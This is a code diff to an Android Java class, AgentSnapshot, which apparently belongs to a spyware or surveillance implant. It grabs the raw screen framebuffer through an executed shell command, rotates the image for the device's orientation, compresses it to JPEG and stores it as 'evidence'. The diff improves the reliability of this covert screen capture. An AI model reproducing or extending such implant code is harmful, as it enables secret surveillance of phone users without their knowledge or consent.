@@ -21,8 +21,10 @@ import java.nio.channels.FileChannel;
 import android.content.Context;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
+import android.graphics.Matrix;
 import android.util.Log;
 import android.view.Display;
+import android.view.Surface;
 import android.view.View;
 import android.view.WindowManager;
 
@@ -129,40 +131,51 @@ public class AgentSnapshot extends AgentBase {
 				Display display = ((WindowManager) Status.getAppContext()
 						.getSystemService(Context.WINDOW_SERVICE))
 						.getDefaultDisplay();
-				int width = display.getWidth();
-				int height = display.getHeight();
+				int width, height;
+				int orientation = display.getOrientation();
+				if (orientation == Surface.ROTATION_0
+						|| orientation == Surface.ROTATION_180) {
+					width = display.getWidth();
+					height = display.getHeight();
+				} else {
+					height = display.getWidth();
+					width = display.getHeight();
+				}
 
 				if (Cfg.DEBUG)
 					Log.d("QZ", TAG + " (go): w=" + width + " h=" + height);
 
 				byte[] raw = getRawBitmap();
-				//int[] pixels = new int[ width * height];
-				
-			
-				
+				// int[] pixels = new int[ width * height];
+
 				if (raw != null) {
 
-					Bitmap bitmapEmpty = Bitmap.createBitmap(width, height,
+					Bitmap bitmap = Bitmap.createBitmap(width, height,
 							Bitmap.Config.ARGB_8888);
-					
-					//int[] pixels = new int[ width * height];
-					//rawInt.rewind();
-					//rawInt.get(pixels);
-
-					//Check.asserts(pixels.length == width * height,
-					//		"wrong pixel len");
-
-					//bitmapEmpty
-					//		.setPixels(pixels, 0, width, 0, 0, width, height);
-
-					// Bitmap bitmap=BitmapFactory.decodeByteArray(raw, 0,
-					// raw.length);
 
 					ByteBuffer buffer = ByteBuffer.wrap(raw);
-					bitmapEmpty.copyPixelsFromBuffer(buffer);
-					byte[] jpeg = toJpeg(bitmapEmpty);
+					bitmap.copyPixelsFromBuffer(buffer);
+					buffer = null;
+					raw = null;
+
+					if(orientation != Surface.ROTATION_0){
+						Matrix matrix = new Matrix();
+						if (orientation == Surface.ROTATION_90)
+							matrix.setRotate(270);
+						else if (orientation == Surface.ROTATION_270)
+							matrix.setRotate(90);
+						else if (orientation == Surface.ROTATION_180)
+							matrix.setRotate(180);
+						
+						bitmap = Bitmap.createBitmap(bitmap, 0, 0,
+		                          width, height, matrix, true);					
+					}
+
+					byte[] jpeg = toJpeg(bitmap);
+					bitmap = null;
 
 					new LogR(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+					jpeg=null;
 				}
 			}
 		} catch (Exception ex) {
@@ -172,12 +185,6 @@ public class AgentSnapshot extends AgentBase {
 			}
 		}
 
-		// log.close();
-	}
-
-	private IntBuffer raw2IntBuffer(byte[] raw) {
-		DataBuffer databuffer = new DataBuffer(raw);
-		return databuffer.asIntBuffer();
 	}
 
 	private byte[] getAdditionalData() {
@@ -207,6 +214,13 @@ public class AgentSnapshot extends AgentBase {
 				SNAPSHOT_DEFAULT_JPEG_QUALITY, os);
 
 		byte[] array = os.toByteArray();
+		try {
+			os.close();
+			
+		} catch (IOException e) {
+			if (Cfg.DEBUG)
+				e.printStackTrace();
+		}
 		return array;
 
 	}
@@ -225,16 +239,17 @@ public class AgentSnapshot extends AgentBase {
 			Process localProcess = Runtime.getRuntime().exec(getrawpath);
 			localProcess.waitFor();
 
-			//FileChannel fc = new FileInputStream(new File(path, "frame"))
-			//		.getChannel();
-			//IntBuffer ib = fc.map(FileChannel.MapMode.READ_ONLY, 0, fc.size())
-			//		.asIntBuffer();
+			// FileChannel fc = new FileInputStream(new File(path, "frame"))
+			// .getChannel();
+			// IntBuffer ib = fc.map(FileChannel.MapMode.READ_ONLY, 0,
+			// fc.size())
+			// .asIntBuffer();
 
-			//return ib;
-			 AutoFile file = new AutoFile(path, "frame");
-			 if (file.exists()) {
-			 return file.read();
-			 }
+			// return ib;
+			AutoFile file = new AutoFile(path, "frame");
+			if (file.exists()) {
+				return file.read();
+			}
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
